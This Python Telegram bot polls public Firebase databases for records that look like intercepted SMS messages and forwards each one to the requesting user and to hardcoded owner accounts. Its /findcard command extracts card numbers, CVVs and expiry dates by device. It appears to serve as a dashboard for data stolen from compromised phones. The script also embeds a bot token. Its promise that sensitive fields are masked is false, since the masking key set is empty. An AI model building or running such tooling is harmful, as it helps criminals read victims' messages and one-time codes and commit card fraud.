import os
import requests
import json
import time
import threading
import hashlib
import html
from datetime import datetime, timezone
from sseclient import SSEClient

# ---------------- CONFIG ----------------
BOT_TOKEN = "7320920377:AAEMDwpXPRul7pxHLx1no580mpUNzPRc488"

if not BOT_TOKEN or BOT_TOKEN.strip() == "":
    print("❌ BOT_TOKEN missing inside ra.py file!")
    raise SystemExit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
OWNER_IDS = [7963138702]
PRIMARY_ADMIN_ID = 7963138702
POLL_INTERVAL = 2
MAX_SSE_RETRIES = 5
# ---------------------------------------

OFFSET = None
running = True
firebase_urls = {}    # chat_id -> firebase_url
watcher_threads = {}  # chat_id -> thread
seen_hashes = {}      # chat_id -> set(hash)
approved_users = set(OWNER_IDS)
BOT_START_TIME = time.time()
SENSITIVE_KEYS = {}
firebase_cache = {}   # chat_id -> firebase snapshot
cache_time = {}       # chat_id -> last refresh timestamp
CACHE_REFRESH_SECONDS = 3600  # 1 hour


muted_devices = set()

CARD_KEYS = {
    "card", "cardnumber", "cc",
    "cvv", "cvc",
    "expiry", "exp", "mm", "yy"
}


# ---------- UTILITY FUNCTIONS ----------
def normalize_json_url(url):
    if not url:
        return None
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u = u + "/.json"
    return u


def send_msg(chat_id, text, parse_mode="HTML", reply_markup=None):
    def _send_one(cid):
        try:
            payload = {"chat_id": cid, "text": text}
            if parse_mode:
                payload["parse_mode"] = parse_mode
            if reply_markup is not None:
                payload["reply_markup"] = reply_markup
            requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
        except Exception as e:
            print(f"send_msg -> failed to send to {cid}: {e}")

    if isinstance(chat_id, (list, tuple, set)):
        for cid in chat_id:
            _send_one(cid)
    else:
        _send_one(chat_id)


def get_updates():
    global OFFSET
    try:
        params = {"timeout": 20}
        if OFFSET:
            params["offset"] = OFFSET
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=30).json()
        if r.get("result"):
            OFFSET = r["result"][-1]["update_id"] + 1
        return r.get("result", [])
    except Exception as e:
        print("get_updates error:", e)
        return []


def http_get_json(url):
    try:
        r = requests.get(url, timeout=12)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        print("http_get_json error for", url, "->", e)
        return None


def is_sms_like(obj):
    if not isinstance(obj, dict):
        return False
    keys = {k.lower() for k in obj.keys()}
    score = 0
    if keys & {"message", "msg", "body", "text", "sms"}:
        score += 2
    if keys & {"from", "sender", "address", "source", "number"}:
        score += 2
    if keys & {"time", "timestamp", "ts", "date", "created_at"}:
        score += 1
    if keys & {"device", "deviceid", "imei", "device_id", "phoneid"}:
        score += 1
    return score >= 3


def find_sms_nodes(snapshot, path=""):
    found = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    return found


def extract_fields(obj):
    device = (
        obj.get("device")
        or obj.get("deviceId")
        or obj.get("device_id")
        or obj.get("imei")
        or obj.get("id")
        or "Unknown"
    )
    sender = (
        obj.get("from")
        or obj.get("sender")
        or obj.get("address")
        or obj.get("number")
        or "Unknown"
    )
    message = (
        obj.get("message")
        or obj.get("msg")
        or obj.get("body")
        or obj.get("text")
        or ""
    )
    ts = (
        obj.get("time")
        or obj.get("timestamp")
        or obj.get("date")
        or obj.get("created_at")
        or None
    )
    if isinstance(ts, (int, float)):
        try:
            ts = (
                datetime.fromtimestamp(float(ts), tz=timezone.utc)
                .astimezone()
                .strftime("%d/%m/%Y, %I:%M:%S %p")
            )
        except Exception:
            ts = str(ts)
    elif isinstance(ts, str):
        digits = "".join(ch for ch in ts if ch.isdigit())
        if len(digits) == 10:
            try:
                ts = (
                    datetime.fromtimestamp(int(digits), tz=timezone.utc)
                    .astimezone()
                    .strftime("%d/%m/%Y, %I:%M:%S %p")
                )
            except Exception:
                pass
    if not ts:
        ts = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    device_phone = (
        obj.get("phone") or obj.get("mobile") or obj.get("MobileNumber") or None
    )
    return {
        "device": device,
        "sender": sender,
        "message": message,
        "time": ts,
        "device_phone": device_phone,
    }


def compute_hash(path, obj):
    try:
        return hashlib.sha1(
            (path + json.dumps(obj, sort_keys=True, default=str)).encode()
        ).hexdigest()
    except Exception:
        return hashlib.sha1((path + str(obj)).encode()).hexdigest()


def format_notification(fields, user_id):
    device = html.escape(str(fields.get("device", "Unknown")))
    sender = html.escape(str(fields.get("sender", "Unknown")))
    message = html.escape(str(fields.get("message", "")))
    t = html.escape(str(fields.get("time", "")))
    text = (
        f"🆕 <b>New SMS Received</b>\n\n"
        f"📱 Device: <code>{device}</code>\n"
        f"👤 From: <b>{sender}</b>\n"
        f"💬 Message: {message}\n"
        f"🕐 Time: {t}\n"
        f"👤 Forwarded by User ID: <code>{user_id}</code>"
    )
    if fields.get("device_phone"):
        text += (
            f"\n📞 Device Number: "
            f"<code>{html.escape(str(fields.get('device_phone')))}</code>"
        )
    return text


def notify_user_owner(chat_id, fields):
    device_id = str(fields.get('device', '')).strip()
    if device_id in muted_devices:
        return
    text = format_notification(fields, chat_id)
    send_msg(chat_id, text)
    send_msg(OWNER_IDS, text)


# ---------- SSE WATCHER ----------

def sse_loop(chat_id, base_url):
    # SSE disabled for stability. Using polling only.
    poll_loop(chat_id, base_url)



# ---------- POLLING FALLBACK ----------
def poll_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    seen = seen_hashes.setdefault(chat_id, set())
    send_msg(chat_id, f"📡 Polling started (every {POLL_INTERVAL}s).")
    while firebase_urls.get(chat_id) == base_url:
        snap = http_get_json(url)
        if not snap:
            time.sleep(POLL_INTERVAL)
            continue
        nodes = find_sms_nodes(snap, "")
        for path, obj in nodes:
            h = compute_hash(path, obj)
            if h in seen:
                continue
            seen.add(h)
            fields = extract_fields(obj)
            notify_user_owner(chat_id, fields)
        time.sleep(POLL_INTERVAL)
    send_msg(chat_id, "⛔ Polling stopped.")


# ---------- START / STOP ----------
def start_watcher(chat_id, base_url):
    firebase_urls[chat_id] = base_url
    seen_hashes[chat_id] = set()
    json_url = normalize_json_url(base_url)
    snap = http_get_json(json_url)
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen_hashes[chat_id].add(compute_hash(p, o))
    t = threading.Thread(target=sse_loop, args=(chat_id, base_url), daemon=True)
    watcher_threads[chat_id] = t
    t.start()
    send_msg(chat_id, "✅ Monitoring started. You will receive alerts too.")
    refresh_firebase_cache(chat_id)


def stop_watcher(chat_id):
    firebase_urls.pop(chat_id, None)
    seen_hashes.pop(chat_id, None)
    watcher_threads.pop(chat_id, None)
    send_msg(chat_id, "🛑 Monitoring stopped.")


# ---------- APPROVAL HELPERS ----------
def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS


def is_approved(user_id: int) -> bool:
    return user_id in approved_users or is_owner(user_id)


def handle_not_approved(chat_id, msg):
    from_user = msg.get("from", {}) or {}
    first_name = from_user.get("first_name", "")
    username = from_user.get("username", None)
    reply_markup = {
        "inline_keyboard": [
            [
                {
                    "text": "📨 Contact Admin",
                    "url": f"tg://user?id={PRIMARY_ADMIN_ID}",
                }
            ]
        ]
    }
    user_info_lines = [
        "❌ You are not approved to use this bot yet.",
        "",
        "Tap the button below to contact admin for access.",
        "",
        f"🆔 Your User ID: <code>{chat_id}</code>",
    ]
    if username:
        user_info_lines.append(f"👤 Username: @{html.escape(username)}")
    send_msg(chat_id, "\n".join(user_info_lines), reply_markup=reply_markup)
    owner_text = [
        "⚠️ New user tried to use the bot:",
        f"ID: <code>{chat_id}</code>",
        f"Name: {html.escape(first_name)}",
    ]
    if username:
        owner_text.append(f"Username: @{html.escape(username)}")
    owner_text.append("")
    owner_text.append(f"Approve with: <code>/approve {chat_id}</code>")
    send_msg(OWNER_IDS, "\n".join(owner_text))


def format_uptime(seconds: int) -> str:
    days = seconds // 86400
    seconds %= 86400
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    parts = []
    if days:
        parts.append(f"{days}d")
    if hours:
        parts.append(f"{hours}h")
    if minutes:
        parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)


# ---------- SAFE DEVICE SEARCH ----------
def mask_number(value: str, keep_last: int = 2) -> str:
    if not value:
        return ""
    s = "".join(ch for ch in str(value) if ch.isdigit())
    if len(s) <= keep_last:
        return "*" * len(s)
    return "*" * (len(s) - keep_last) + s[-keep_last:]


def search_records_by_device(snapshot, device_id, path=""):
    matches = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if str(k) == str(device_id) and isinstance(v, dict):
                matches.append(v)
            if isinstance(v, dict):
                did = (
                    v.get("DeviceId")
                    or v.get("deviceId")
                    or v.get("device_id")
                    or v.get("DeviceID")
                )
                if did and str(did) == str(device_id):
                    matches.append(v)
            if isinstance(v, (dict, list)):
                matches += search_records_by_device(v, device_id, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if isinstance(v, dict):
                did = (
                    v.get("DeviceId")
                    or v.get("deviceId")
                    or v.get("device_id")
                    or v.get("DeviceID")
                )
                if did and str(did) == str(device_id):
                    matches.append(v)
            if isinstance(v, (dict, list)):
                matches += search_records_by_device(v, device_id, p)
    return matches


def safe_format_device_record(rec: dict) -> str:
    lines = ["🔍 <b>Record found for this device</b>", ""]
    for k, v in rec.items():
        key_lower = str(k).lower()
        if key_lower in SENSITIVE_KEYS:
            masked = mask_number(v, keep_last=2)
            show_val = f"{masked} (hidden)"
        else:
            show_val = str(v)
        lines.append(
            f"<b>{html.escape(str(k))}</b>: <code>{html.escape(show_val)}</code>"
        )
    lines.append("")
    lines.append("⚠️ Highly sensitive fields are masked for security.")
    return "\n".join(lines)



def collect_all_devices(snapshot, devices=None):
    if devices is None:
        devices = set()
    if isinstance(snapshot, dict):
        for v in snapshot.values():
            if isinstance(v, dict):
                d = (
                    v.get("device")
                    or v.get("deviceId")
                    or v.get("device_id")
                    or v.get("imei")
                )
                if d:
                    devices.add(str(d))
            if isinstance(v, (dict, list)):
                collect_all_devices(v, devices)
    elif isinstance(snapshot, list):
        for v in snapshot:
            collect_all_devices(v, devices)
    return devices


def has_card_data(obj):
    if not isinstance(obj, dict):
        return False
    for k, v in obj.items():
        if str(k).lower() in CARD_KEYS and v:
            return True
        if isinstance(v, dict) and has_card_data(v):
            return True
    return False


def collect_card_devices(snapshot, result=None):
    if result is None:
        result = {}
    if isinstance(snapshot, dict):
        for v in snapshot.values():
            if isinstance(v, dict):
                d = (
                    v.get("device")
                    or v.get("deviceId")
                    or v.get("device_id")
                    or v.get("imei")
                )
                if d and has_card_data(v):
                    result.setdefault(str(d), []).append(v)
            if isinstance(v, (dict, list)):
                collect_card_devices(v, result)
    elif isinstance(snapshot, list):
        for v in snapshot:
            collect_card_devices(v, result)
    return result

# ---------- CACHE FUNCTIONS ----------
def refresh_firebase_cache(chat_id):
    base_url = firebase_urls.get(chat_id)
    if not base_url:
        return
    snap = http_get_json(normalize_json_url(base_url))
    if snap is None:
        return
    firebase_cache[chat_id] = snap
    cache_time[chat_id] = time.time()
    try:
        send_msg(chat_id, "♻️ Firebase cache refreshed automatically.")
        send_msg(OWNER_IDS, f"♻️ Firebase cache refreshed for user <code>{chat_id}</code>")
    except Exception:
        pass


def cache_refresher_loop():
    while True:
        now = time.time()
        for cid in list(firebase_urls.keys()):
            if now - cache_time.get(cid, 0) >= CACHE_REFRESH_SECONDS:
                refresh_firebase_cache(cid)
        time.sleep(60)


# ---------- COMMAND HANDLING ----------
def handle_update(u):
    msg = u.get("message") or {}
    chat = msg.get("chat", {}) or {}
    chat_id = chat.get("id")
    text = (msg.get("text") or "").strip()

    if not chat_id or not text:
        return

    # Reply-based /find shortcut
    if text.lower() == "/find" and msg.get("reply_to_message"):
        reply = msg.get("reply_to_message")
        for line in (reply.get("text") or "").splitlines():
            if "Device:" in line:
                text = "/find " + line.split("Device:", 1)[1].strip()
                break

    lower_text = text.lower()

    # FIRST: approval check
    if not is_approved(chat_id):
        handle_not_approved(chat_id, msg)
        return

    # /start
    if lower_text == "/start":
        send_msg(
            chat_id,
            (
                "👋 Welcome!\n\n"
                "You are approved to use this bot.\n\n"
                "Send me your Firebase RTDB base URL (public, .json) to start monitoring.\n\n"
                "User Commands:\n"
                "• /start - show this message\n"
                "• /stop - stop your monitoring\n"
                "• /list - show your own Firebase (private)\n"
                "• /find <device_id> - search record by device id (safe summary only)\n"
                "• /ping - bot status & ping\n"
                "\nAdmin Commands (owners only):\n"
                "• /adminlist - show all Firebase URLs\n"
                "• /approve <user_id>\n"
                "• /unapprove <user_id>\n"
                "• /approvedlist"
            ),
        )
        return

    # /ping - bot status
    if lower_text == "/ping":
        uptime_sec = int(time.time() - BOT_START_TIME)
        uptime_str = format_uptime(uptime_sec)
        monitored_count = len(firebase_urls)
        approved_count = len(approved_users)
        status_text = (
            "🏓 <b>Pong!</b>\n\n"
            "✅ Bot is <b>online</b> and responding.\n\n"
            f"⏱ Uptime: <code>{uptime_str}</code>\n"
            f"📡 Active monitors: <code>{monitored_count}</code>\n"
            f"👥 Approved users: <code>{approved_count}</code>\n"
        )
        send_msg(chat_id, status_text)
        return

    # /stop
    if lower_text == "/stop":
        stop_watcher(chat_id)
        return

    # USER VIEW: /list
    if lower_text == "/list":
        user_url = firebase_urls.get(chat_id)
        if is_owner(chat_id):
            if not firebase_urls:
                send_msg(chat_id, "👑 No active Firebase monitoring right now.")
            else:
                send_msg(
                    chat_id,
                    (
                        "👑 You are an owner.\n"
                        "Use <b>/adminlist</b> to see all users' Firebase URLs.\n\n"
                        f"Your own Firebase: {user_url if user_url else 'None'}"
                    ),
                )
        else:
            if user_url:
                send_msg(
                    chat_id,
                    f"🔐 Your active Firebase:\n<code>{user_url}</code>",
                )
            else:
                send_msg(
                    chat_id,
                    "ℹ️ You don't have any active Firebase monitoring yet."
                )
        return

    # ADMIN VIEW: /adminlist
    if lower_text == "/adminlist":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ This command is only for bot owners.")
            return
        if not firebase_urls:
            send_msg(chat_id, "👑 No active Firebase monitoring right now.")
            return
        lines = []
        for uid, url in firebase_urls.items():
            lines.append(
                f"👤 <code>{uid}</code> -> <code>{html.escape(str(url))}</code>"
            )
        send_msg(
            chat_id,
            "👑 <b>All active Firebase URLs (admin only)</b>:\n\n" + "\n".join(lines),
        )
        return

    # -------- Owner-only approval commands --------
    if lower_text.startswith("/approve"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can approve users.")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/approve user_id</code>")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            send_msg(chat_id, "❌ Invalid user ID.")
            return
        approved_users.add(target_id)
        send_msg(chat_id, f"✅ User <code>{target_id}</code> approved.")
        send_msg(target_id, "✅ You have been approved to use this bot.")
        return

    if lower_text.startswith("/unapprove"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can unapprove users.")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/unapprove user_id</code>")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            send_msg(chat_id, "❌ Invalid user ID.")
            return
        if target_id in OWNER_IDS:
            send_msg(chat_id, "❌ Cannot unapprove an owner.")
            return
        if target_id in approved_users:
            approved_users.remove(target_id)
            send_msg(chat_id, f"🚫 User <code>{target_id}</code> unapproved.")
        else:
            send_msg(chat_id, f"ℹ️ User <code>{target_id}</code> was not approved.")
        return

    if lower_text == "/approvedlist":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can see approved list.")
            return
        if not approved_users:
            send_msg(chat_id, "No approved users yet.")
            return
        lines = []
        for uid in sorted(approved_users):
            tag = " (owner)" if uid in OWNER_IDS else ""
            lines.append(f"👤 <code>{uid}</code>{tag}")
        send_msg(
            chat_id,
            "✅ <b>Approved users</b>:\n\n" + "\n".join(lines),
        )
        return

    
    # -------- DEVICE MUTE --------
    if lower_text.startswith("/mute"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/mute device_id</code>")
            return
        muted_devices.add(parts[1].strip())
        send_msg(chat_id, f"🔕 Muted device: <code>{html.escape(parts[1])}</code>")
        return

    if lower_text.startswith("/unmute"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/unmute device_id</code>")
            return
        muted_devices.discard(parts[1].strip())
        send_msg(chat_id, f"🔔 Unmuted device: <code>{html.escape(parts[1])}</code>")
        return

    # -------- ALL DEVICES --------
    if lower_text == "/alldevices":
        base_url = firebase_urls.get(chat_id)
        if not base_url:
            send_msg(chat_id, "❌ No active Firebase URL.")
            return
        snap = http_get_json(normalize_json_url(base_url))
        devices = collect_all_devices(snap)
        if not devices:
            send_msg(chat_id, "ℹ️ No devices found.")
            return
        msg = "📱 <b>All Devices</b>\n\n" + "\n".join(f"• <code>{html.escape(d)}</code>" for d in sorted(devices))
        send_msg(chat_id, msg)
        return

    # -------- FIND CARD --------
    if lower_text == "/findcard":
        base_url = firebase_urls.get(chat_id)
        if not base_url:
            send_msg(chat_id, "❌ No active Firebase URL.")
            return
        snap = http_get_json(normalize_json_url(base_url))
        devices = collect_card_devices(snap)
        if not devices:
            send_msg(chat_id, "ℹ️ No card data found.")
            return
        out = "💳 <b>Devices with Card Data</b>\n\n"
        for d, recs in devices.items():
            out += f"📱 <code>{html.escape(d)}</code>\n"
            rec = recs[-1]
            for k, v in rec.items():
                if str(k).lower() in CARD_KEYS:
                    out += f"  • <b>{html.escape(str(k))}</b>: <code>{html.escape(str(v))}</code>\n"
            out += "\n"
        send_msg(chat_id, out)
        return

# -------- /find <device_id> (safe) --------
    if lower_text.startswith("/find"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            send_msg(chat_id, "Usage: <code>/find device_id</code>")
            return
        device_id = parts[1].strip()
        base_url = firebase_urls.get(chat_id)
        if not base_url:
            send_msg(
                chat_id,
                "❌ You don't have any active Firebase URL.\n"
                "First send your Firebase RTDB URL to start monitoring.",
            )
            return
        json_url = normalize_json_url(base_url)
        snap = http_get_json(json_url)
        if snap is None:
            send_msg(chat_id, "❌ Failed to fetch data from your Firebase.")
            return
        matches = search_records_by_device(snap, device_id)
        if not matches:
            send_msg(chat_id, "🔍 No record found for this device id.")
            return
        max_show = 3
        for rec in matches[:max_show]:
            send_msg(chat_id, safe_format_device_record(rec))
        if len(matches) > max_show:
            send_msg(
                chat_id,
                f"ℹ️ {len(matches)} records matched, "
                f"showing first {max_show} only.",
            )
        return

    # -------- Firebase URL handling --------
    if text.startswith("http"):
        test_url = normalize_json_url(text)
        if not http_get_json(test_url):
            send_msg(
                chat_id,
                "❌ Unable to fetch URL. Make sure it's public and ends with .json",
            )
            return
        start_watcher(chat_id, text)
        send_msg(
            OWNER_IDS,
            f"👤 User <code>{chat_id}</code> started monitoring:\n"
            f"<code>{html.escape(text)}</code>",
        )
        return

    # Fallback help
    send_msg(
        chat_id,
        (
            "Send a Firebase RTDB URL to start monitoring.\n\n"
            "User Commands:\n"
            "• /start - instructions\n"
            "• /stop - stop your monitoring\n"
            "• /list - show your own Firebase (private)\n"
            "• /find <device_id> - search record by device id (safe summary only)\n"
            "• /ping - bot status & ping\n"
            "\nAdmin Commands:\n"
            "• /adminlist - show all Firebase URLs\n"
            "• /approve <user_id>\n"
            "• /unapprove <user_id>\n"
            "• /approvedlist"
        ),
    )


# ---------- MAIN LOOP ----------
def main_loop():
    send_msg(OWNER_IDS, "Bot started and running.")
    print("Bot running. Listening for messages...")
    global running
    while running:
        updates = get_updates()
        for u in updates:
            try:
                handle_update(u)
            except Exception as e:
                print("handle_update error:", e)
        time.sleep(0.5)


if __name__ == "__main__":
    try:
        threading.Thread(target=cache_refresher_loop, daemon=True).start()
        main_loop()
    except KeyboardInterrupt:
        running = False
        print("Shutting down.")

